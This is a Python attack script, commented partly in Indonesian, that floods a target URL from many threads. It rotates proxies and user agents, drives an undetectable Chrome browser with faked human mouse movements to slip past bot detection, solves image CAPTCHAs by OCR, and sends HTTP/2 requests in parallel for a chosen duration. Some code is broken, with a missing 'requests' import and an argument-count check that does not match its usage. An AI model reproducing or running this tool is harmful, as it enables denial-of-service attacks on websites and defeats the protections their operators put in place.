import random
import time
import sys
import cv2
import numpy as np
from PIL import Image
from io import BytesIO
from threading import Thread
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from datetime import datetime
import httpx  # For HTTP/2 requests
import pytesseract
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ActionChains

# Konfigurasi Tesseract OCR (untuk CAPTCHA berbasis gambar)
pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract'  # Sesuaikan path Tesseract

def load_proxies(proxy_file):
    with open(proxy_file, 'r') as f:
        proxies = f.readlines()
    return [proxy.strip() for proxy in proxies]

def load_user_agents(user_agent_file):
    with open(user_agent_file, 'r') as f:
        user_agents = f.readlines()
    return [ua.strip() for ua in user_agents]

def format_output(ip_port, user_agent, cookie, captcha_solution, success):
    timestamp = datetime.now().strftime("%H:%M:%S")
    status = "SUCCESS" if success else "FAIL"
    print(f"TIME {timestamp} | {ip_port} | User Agent: {user_agent} | Cookie: {cookie} | Captcha Solution: {captcha_solution} | Status: {status}")

def generate_random_cookies():
    return f"session_id={random.randint(1000000, 9999999)}; user_id={random.randint(100000, 999999)}"

def preprocess_captcha_image(image):
    cv_image = np.array(image.convert('RGB'))
    cv_image = cv_image[:, :, ::-1].copy()  # Convert RGB to BGR

    gray_image = cv2.cvtColor(cv_image, cv2.COLOR_BGR2GRAY)
    thresholded_image = cv2.adaptiveThreshold(
        gray_image, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C,
        cv2.THRESH_BINARY, 11, 2
    )

    kernel = np.ones((2, 2), np.uint8)
    cleaned_image = cv2.morphologyEx(thresholded_image, cv2.MORPH_CLOSE, kernel)
    cleaned_image = cv2.morphologyEx(cleaned_image, cv2.MORPH_OPEN, kernel)

    return cleaned_image

def solve_captcha(image):
    try:
        preprocessed_image = preprocess_captcha_image(image)
        captcha_text = pytesseract.image_to_string(preprocessed_image, config='--psm 6')
        return captcha_text.strip()
    except Exception as e:
        print(f"Error solving CAPTCHA: {e}")
        return None

def handle_javascript_captcha(driver):
    try:
        WebDriverWait(driver, 20).until(
            EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, 'iframe[src*="recaptcha"]'))
        )
        WebDriverWait(driver, 20).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, 'div.recaptcha-checkbox'))
        ).click()
        driver.switch_to.default_content()
    except Exception as e:
        print(f"Error handling JavaScript CAPTCHA: {e}")

def retry_captcha_solving(driver, max_retries=3):
    for _ in range(max_retries):
        try:
            captcha_image_element = driver.find_element(By.CSS_SELECTOR, 'img.captcha_image')
            image_url = captcha_image_element.get_attribute('src')
            image_response = requests.get(image_url)
            image_bytes = BytesIO(image_response.content)
            captcha_image = Image.open(image_bytes)

            captcha_solution = solve_captcha(captcha_image)
            if captcha_solution:
                print(f"Captcha solved: {captcha_solution}")
                return captcha_solution
            else:
                print("Captcha solution failed. Retrying...")
                time.sleep(5)  # Wait before retrying
        except Exception as e:
            print(f"Error during CAPTCHA solving: {e}")
            time.sleep(5)  # Wait before retrying
    return None

def handle_captcha_form(driver, captcha_solution):
    try:
        captcha_input = driver.find_element(By.CSS_SELECTOR, 'input.captcha_input')
        captcha_input.send_keys(captcha_solution)
        captcha_input.send_keys(Keys.RETURN)  # Submit the form
        time.sleep(5)  # Wait for response
    except Exception as e:
        print(f"Error filling CAPTCHA solution: {e}")

def human_like_movements(driver):
    action_chains = ActionChains(driver)
    
    # Random mouse movements
    for _ in range(random.randint(5, 15)):
        action_chains.move_by_offset(random.randint(-100, 100), random.randint(-100, 100)).perform()
        time.sleep(random.uniform(0.1, 0.5))
    
    # Random keystrokes
    random_keys = random.choice([Keys.ARROW_DOWN, Keys.ARROW_UP, Keys.TAB])
    driver.find_element(By.TAG_NAME, 'body').send_keys(random_keys)

    time.sleep(random.uniform(0.5, 2.5))

def browser_attack(proxy, user_agent, target_url):
    try:
        options = uc.ChromeOptions()
        options.add_argument(f'--proxy-server={proxy}')
        options.add_argument(f'user-agent={user_agent}')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        service = Service(executable_path="/path/to/chromedriver")  # Sesuaikan path chromedriver
        driver = uc.Chrome(options=options, service=service)

        driver.get(target_url)

        time.sleep(random.uniform(8, 12))  # Wait for the page to fully load
        
        # Human-like movements to reduce bot detection
        human_like_movements(driver)

        cookies = driver.get_cookies()
        random_cookie = generate_random_cookies()
        cookie_str = "; ".join([f"{cookie['name']}={cookie['value']}" for cookie in cookies] + [random_cookie])

        captcha_solution = retry_captcha_solving(driver)
        if captcha_solution:
            handle_captcha_form(driver, captcha_solution)
            format_output(proxy, user_agent, cookie_str, captcha_solution, True)
        else:
            handle_javascript_captcha(driver)
            format_output(proxy, user_agent, cookie_str, "", False)
        
        driver.quit()

    except Exception as e:
        format_output(proxy, user_agent, "", "", False)
        print(f"Error during browser attack: {e}")

# HTTP/2 Attack Method
def http2_attack(target_url, proxy, user_agent):
    headers = {
        'User-Agent': user_agent,
        'Content-Type': 'application/json'
    }
    proxies = {
        'http://': f'http://{proxy}',
        'https://': f'https://{proxy}'
    }
    
    try:
        # Using HTTP/2
        with httpx.Client(http2=True, proxies=proxies) as client:
            response = client.get(target_url, headers=headers)
            if response.status_code == 200:
                print(f"[HTTP/2] Request successful. Target URL: {target_url}")
            else:
                print(f"[HTTP/2] Failed request with status code: {response.status_code}")
    except Exception as e:
        print(f"[HTTP/2] Error during HTTP/2 attack: {e}")

# Function to run both attacks (browser & http2) in parallel
def combined_attack(proxy, user_agent, target_url):
    browser_thread = Thread(target=browser_attack, args=(proxy, user_agent, target_url))
    http2_thread = Thread(target=http2_attack, args=(target_url, proxy, user_agent))
    
    browser_thread.start()
    http2_thread.start()
    
    browser_thread.join()
    http2_thread.join()

def start_attack(proxy_list, user_agent_list, target_url, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        proxy = random.choice(proxy_list)
        user_agent = random.choice(user_agent_list)
        combined_attack(proxy, user_agent, target_url)

if len(sys.argv) != 5:
    print("Usage: python attack.py [targetURL] [duration] [threads] [proxyFile] [userAgentFile]")
    sys.exit(1)

target_url = sys.argv[1]
duration = int(sys.argv[2])
threads = int(sys.argv[3])
proxy_file = sys.argv[4]
user_agent_file = sys.argv[5]

# Load proxies and user-agents
proxy_list = load_proxies(proxy_file)
user_agent_list = load_user_agents(user_agent_file)

# Start threads for the attack
for i in range(threads):
    th = Thread(target=start_attack, args=(proxy_list, user_agent_list, target_url, duration))
    th.start()
    print(f"Thread {i+1} started for attack")
